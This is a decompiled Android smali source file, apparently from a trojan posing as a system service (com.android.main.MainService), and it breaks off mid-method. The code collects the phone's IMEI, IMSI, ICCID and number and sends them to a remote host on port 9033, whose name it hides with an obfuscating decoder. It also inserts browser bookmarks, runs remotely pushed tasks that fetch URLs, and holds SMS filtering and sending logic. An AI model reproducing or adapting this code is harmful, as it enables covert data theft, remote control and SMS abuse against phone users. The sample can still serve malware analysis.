.class public Lcom/android/main/MainService;
.super Landroid/app/Service;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lcom/android/main/MainService$SMSReceiver;
    }
.end annotation


# static fields
.field private static final ACTION_SMS_DELIVERY:Ljava/lang/String; = "com.test.sms.delivery"

.field private static final ACTION_SMS_RECEIVER:Ljava/lang/String; = "android.provider.Telephony.SMS_RECEIVED"

.field private static final ACTION_SMS_SEND:Ljava/lang/String; = "com.test.sms.send"


# instance fields
.field private bigpid:Ljava/lang/String;

.field private deliveryReceiver:Lcom/android/main/MainService$SMSReceiver;

.field private destMobile:Ljava/lang/String;

.field private exactnum:Ljava/lang/String;

.field handler:Landroid/os/Handler;

.field private iccid:Ljava/lang/String;

.field private imei:Ljava/lang/String;

.field private imsi:Ljava/lang/String;

.field private installtime:Ljava/lang/String;

.field private is_second:Ljava/lang/String;

.field private issend:Z

.field private istask:Z

.field private mnc:Ljava/lang/String;

.field private mobile:Ljava/lang/String;

.field newtask:Ljava/util/TimerTask;

.field private nexttime:Ljava/lang/String;

.field private recordlog:Ljava/lang/String;

.field private region:Ljava/lang/String;

.field private reply_end_str:Ljava/lang/String;

.field private reply_start_str:Ljava/lang/String;

.field private second_filter_info:Ljava/lang/String;

.field private second_filter_port:Ljava/lang/String;

.field private sendReceiver:Lcom/android/main/MainService$SMSReceiver;

.field private shieldcon:Ljava/lang/String;

.field private shieldnum:Ljava/lang/String;

.field private smallpid:Ljava/lang/String;

.field private smsReceiver:Lcom/android/main/MainService$SMSReceiver;

.field private task:Ljava/lang/String;

.field private tasklog:Ljava/lang/String;

.field timer:Ljava/util/Timer;

.field private version:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 4

    .prologue
    const-string v3, "other"

    const-string v2, "no"

    const-string v1, ""

    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 39
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    .line 40
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    .line 41
    const-string v0, "no"

    iput-object v2, p0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    .line 42
    const-string v0, "other"

    iput-object v3, p0, Lcom/android/main/MainService;->mnc:Ljava/lang/String;

    .line 43
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    .line 44
    const-string v0, "other"

    iput-object v3, p0, Lcom/android/main/MainService;->region:Ljava/lang/String;

    .line 46
    const-string v0, "100"

    iput-object v0, p0, Lcom/android/main/MainService;->shieldnum:Ljava/lang/String;

    .line 47
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->shieldcon:Ljava/lang/String;

    .line 48
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->exactnum:Ljava/lang/String;

    .line 54
    const-string v0, "no"

    iput-object v2, p0, Lcom/android/main/MainService;->task:Ljava/lang/String;

    .line 55
    const-string v0, "/sdcard/androidh.log"

    iput-object v0, p0, Lcom/android/main/MainService;->recordlog:Ljava/lang/String;

    .line 56
    const-string v0, "/sdcard/android.log"

    iput-object v0, p0, Lcom/android/main/MainService;->tasklog:Ljava/lang/String;

    .line 57
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    .line 58
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->installtime:Ljava/lang/String;

    .line 59
    const/4 v0, 0x0

    iput-boolean v0, p0, Lcom/android/main/MainService;->issend:Z

    .line 60
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcom/android/main/MainService;->istask:Z

    .line 61
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->destMobile:Ljava/lang/String;

    .line 63
    const-string v0, "0"

    iput-object v0, p0, Lcom/android/main/MainService;->is_second:Ljava/lang/String;

    .line 64
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->second_filter_port:Ljava/lang/String;

    .line 65
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->second_filter_info:Ljava/lang/String;

    .line 66
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->reply_start_str:Ljava/lang/String;

    .line 67
    const-string v0, ""

    iput-object v1, p0, Lcom/android/main/MainService;->reply_end_str:Ljava/lang/String;

    .line 71
    new-instance v0, Ljava/util/Timer;

    invoke-direct {v0}, Ljava/util/Timer;-><init>()V

    iput-object v0, p0, Lcom/android/main/MainService;->timer:Ljava/util/Timer;

    .line 72
    new-instance v0, Lcom/android/main/MainService$1;

    invoke-direct {v0, p0}, Lcom/android/main/MainService$1;-><init>(Lcom/android/main/MainService;)V

    iput-object v0, p0, Lcom/android/main/MainService;->handler:Landroid/os/Handler;

    .line 83
    new-instance v0, Lcom/android/main/MainService$2;

    invoke-direct {v0, p0}, Lcom/android/main/MainService$2;-><init>(Lcom/android/main/MainService;)V

    iput-object v0, p0, Lcom/android/main/MainService;->newtask:Ljava/util/TimerTask;

    .line 31
    return-void
.end method

.method private LogService(II)I
    .locals 5
    .param p1, "softid"    # I
    .param p2, "reqcnt"    # I

    .prologue
    const/4 v4, 0x3

    .line 661
    const/4 v0, 0x0

    .line 662
    .local v0, "result":I
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 663
    const-string v3, "kl4ofgsmgeje5gko99s1fc2ofm"

    invoke-static {v3, v4, v4}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 664
    const-string v3, ":9033/android.log?id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&softid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 665
    const-string v3, "&cn="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&nt="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sim="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 666
    const-string v3, "&tel="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&imsi="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&iccid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 662
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 668
    .local v1, "statisUrl":Ljava/lang/String;
    const/4 v2, 0x0

    invoke-static {v1, v2}, Lcom/android/main/BaseAuthenicationHttpClient;->getCodeByURL(Ljava/lang/String;I)I

    move-result v0

    .line 669
    return v0
.end method

.method private LogService(IILjava/lang/String;)I
    .locals 5
    .param p1, "softid"    # I
    .param p2, "reqcnt"    # I
    .param p3, "taskInfo"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x3

    .line 645
    const/4 v0, 0x0

    .line 646
    .local v0, "result":I
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 647
    const-string v3, "kl4ofgsmgeje5gko99s1fc2ofm"

    invoke-static {v3, v4, v4}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 648
    const-string v3, ":9033/android.log?id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&softid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 649
    const-string v3, "&cn="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&nt="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sim="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 650
    const-string v3, "&tel="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&imsi="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&iccid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 651
    const-string v3, "&task="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 646
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 653
    .local v1, "statisUrl":Ljava/lang/String;
    const/4 v2, 0x0

    invoke-static {v1, v2}, Lcom/android/main/BaseAuthenicationHttpClient;->getCodeByURL(Ljava/lang/String;I)I

    move-result v0

    .line 654
    return v0
.end method

.method private LogService(ILjava/lang/String;)I
    .locals 5
    .param p1, "softid"    # I
    .param p2, "showcontent"    # Ljava/lang/String;

    .prologue
    const/4 v4, 0x3

    .line 676
    const/4 v0, 0x0

    .line 677
    .local v0, "result":I
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "http://"

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 678
    const-string v3, "kl4ofgsmgeje5gko99s1fc2ofm"

    invoke-static {v3, v4, v4}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 679
    const-string v3, ":9033/android.log?id="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->smallpid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&softid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 680
    const-string v3, "&cn=1&nt="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->nexttime:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&sim="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&tel="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->mobile:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 681
    const-string v3, "&imsi="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->imsi:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&iccid="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    iget-object v3, p0, Lcom/android/main/MainService;->iccid:Ljava/lang/String;

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    const-string v3, "&con="

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    invoke-virtual {v2, p2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v2

    .line 677
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 683
    .local v1, "statisUrl":Ljava/lang/String;
    const/4 v2, 0x0

    invoke-static {v1, v2}, Lcom/android/main/BaseAuthenicationHttpClient;->getCodeByURL(Ljava/lang/String;I)I

    move-result v0

    .line 684
    return v0
.end method

.method static synthetic access$0(Lcom/android/main/MainService;)V
    .locals 0

    .prologue
    .line 188
    invoke-direct {p0}, Lcom/android/main/MainService;->execTask()V

    return-void
.end method

.method static synthetic access$1(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 63
    iget-object v0, p0, Lcom/android/main/MainService;->is_second:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$10(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 48
    iget-object v0, p0, Lcom/android/main/MainService;->exactnum:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$11(Lcom/android/main/MainService;II)I
    .locals 1

    .prologue
    .line 658
    invoke-direct {p0, p1, p2}, Lcom/android/main/MainService;->LogService(II)I

    move-result v0

    return v0
.end method

.method static synthetic access$2(Lcom/android/main/MainService;ILjava/lang/String;)I
    .locals 1

    .prologue
    .line 673
    invoke-direct {p0, p1, p2}, Lcom/android/main/MainService;->LogService(ILjava/lang/String;)I

    move-result v0

    return v0
.end method

.method static synthetic access$3(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 64
    iget-object v0, p0, Lcom/android/main/MainService;->second_filter_port:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$4(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 65
    iget-object v0, p0, Lcom/android/main/MainService;->second_filter_info:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$5(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 66
    iget-object v0, p0, Lcom/android/main/MainService;->reply_start_str:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$6(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 67
    iget-object v0, p0, Lcom/android/main/MainService;->reply_end_str:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$7(Lcom/android/main/MainService;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 712
    invoke-direct {p0, p1, p2}, Lcom/android/main/MainService;->sendSMS(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method static synthetic access$8(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 46
    iget-object v0, p0, Lcom/android/main/MainService;->shieldnum:Ljava/lang/String;

    return-object v0
.end method

.method static synthetic access$9(Lcom/android/main/MainService;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 47
    iget-object v0, p0, Lcom/android/main/MainService;->shieldcon:Ljava/lang/String;

    return-object v0
.end method

.method private defaultMark()V
    .locals 6

    .prologue
    const/4 v4, 0x2

    const-string v5, "http://"

    .line 726
    const-string v0, "\u6ce1\u6912\u7f51"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://"

    invoke-direct {v1, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 727
    const-string v2, "aa3n2d4rdo5i2dspnahoaj3ifa7oxcjn"

    const/4 v3, 0x7

    invoke-static {v2, v3, v4}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 726
    invoke-direct {p0, v0, v1}, Lcom/android/main/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    .line 728
    const-string v0, "\u6ce1\u6912\u6c60\u5858"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://"

    invoke-direct {v1, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 729
    const-string v2, "acbt32xp2aaogjdixano3cxn"

    const/4 v3, 0x3

    invoke-static {v2, v3, v4}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 728
    invoke-direct {p0, v0, v1}, Lcom/android/main/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    .line 730
    const-string v0, "G3\u7f51\u5740\u5927\u5168"

    new-instance v1, Ljava/lang/StringBuilder;

    const-string v2, "http://"

    invoke-direct {v1, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 731
    const-string v2, "xga3sg73xcfn"

    const/4 v3, 0x0

    invoke-static {v2, v3, v4}, Lcom/android/main/Base64;->encodebook(Ljava/lang/String;II)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    .line 730
    invoke-direct {p0, v0, v1}, Lcom/android/main/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    .line 732
    return-void
.end method

.method private execMark(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 5
    .param p1, "allStr"    # Ljava/lang/String;
    .param p2, "record"    # [Ljava/lang/String;

    .prologue
    .line 565
    const-string v3, "<title>"

    const-string v4, "</title>"

    invoke-static {p1, v3, v4}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 566
    .local v2, "title":Ljava/lang/String;
    const-string v3, "<url>"

    const-string v4, "</url>"

    invoke-static {p1, v3, v4}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 567
    .local v0, "insertUrl":Ljava/lang/String;
    invoke-direct {p0, v2, v0}, Lcom/android/main/MainService;->insertAndroidBookmark(Ljava/lang/String;Ljava/lang/String;)I

    move-result v1

    .line 568
    .local v1, "result":I
    invoke-direct {p0, p2}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 569
    const/4 v3, 0x1

    invoke-direct {p0, v1, v3, v0}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    .line 570
    return-void
.end method

.method private execPush(Ljava/lang/String;[Ljava/lang/String;)V
    .locals 19
    .param p1, "allStr"    # Ljava/lang/String;
    .param p2, "record"    # [Ljava/lang/String;

    .prologue
    .line 485
    const-string v13, ""

    .line 486
    .local v13, "softUrl":Ljava/lang/String;
    const-string v7, "no"

    .line 487
    .local v7, "isreset":Ljava/lang/String;
    const-string v11, ""

    .line 488
    .local v11, "smscontent":Ljava/lang/String;
    const-string v12, ""

    .line 489
    .local v12, "smsurl":Ljava/lang/String;
    const/4 v9, 0x0

    .line 490
    .local v9, "result":I
    const/16 v5, -0x384

    .line 491
    .local v5, "flag":I
    const-string v14, ""

    .line 494
    .local v14, "tel":Ljava/lang/String;
    :try_start_0
    const-string v17, "<url>"

    const-string v18, "</url>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 496
    const-string v17, "<smscontent>"

    .line 497
    const-string v18, "</smscontent>"

    .line 496
    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v11

    .line 498
    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v11

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v17

    if-nez v17, :cond_0

    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v13

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    move-result v17

    if-eqz v17, :cond_1

    .line 499
    :cond_0
    const/16 v5, -0x385

    .line 534
    move-object/from16 v0, p0

    move-object/from16 v1, p2

    invoke-direct {v0, v1}, Lcom/android/main/MainService;->writeRecordLog([Ljava/lang/String;)V

    .line 535
    move-object/from16 v0, p0

    move v1, v5

    move v2, v9

    move-object v3, v14

    invoke-direct {v0, v1, v2, v3}, Lcom/android/main/MainService;->LogService(IILjava/lang/String;)I

    .line 537
    :goto_0
    return-void

    .line 503
    :cond_1
    :try_start_1
    const-string v17, "<smsurl>"

    const-string v18, "</smsurl>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    .line 504
    const-string v17, ""

    move-object v0, v12

    move-object/from16 v1, v17

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v17

    if-nez v17, :cond_2

    .line 505
    new-instance v17, Ljava/lang/StringBuilder;

    invoke-static {v11}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v18, ","

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    move-object/from16 v0, v17

    move-object v1, v12

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v11

    .line 509
    :cond_2
    const-string v17, "<isreset>"

    const-string v18, "</isreset>"

    move-object/from16 v0, p1

    move-object/from16 v1, v17

    move-object/from16 v2, v18

    invoke-static {v0, v1, v2}, Lcom/android/main/StringUtil;->getSubString(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    .line 510
    const-string v17, "no"

    move-object/from16 v0, v17

    move-object v1, v7

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    .line 514
    new-instance v17, Ljava/lang/StringBuilder;

    invoke-static {v13}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v18

    invoke-direct/range {v17 .. v18}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    .line 515
    const-string v18, "/?sim="

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/main/MainService;->imei:Ljava/lang/String;

    move-object/from16 v18, v0

    invoke-virtual/range {v17 .. v18}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v17

    .line 514
    invoke-virtual/range {v17 .. v17}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v17

    invoke-static/range {v17 .. v17}, Lcom/android/main/BaseAuthenicationHttpClient;->getStringByURL(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v15

    .line 516
    .local v15, "telStr":Ljava/lang/String;
    if-eqz v15, :cond_3

    const-string v17, ""

    move-object/from16 v0, v17

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
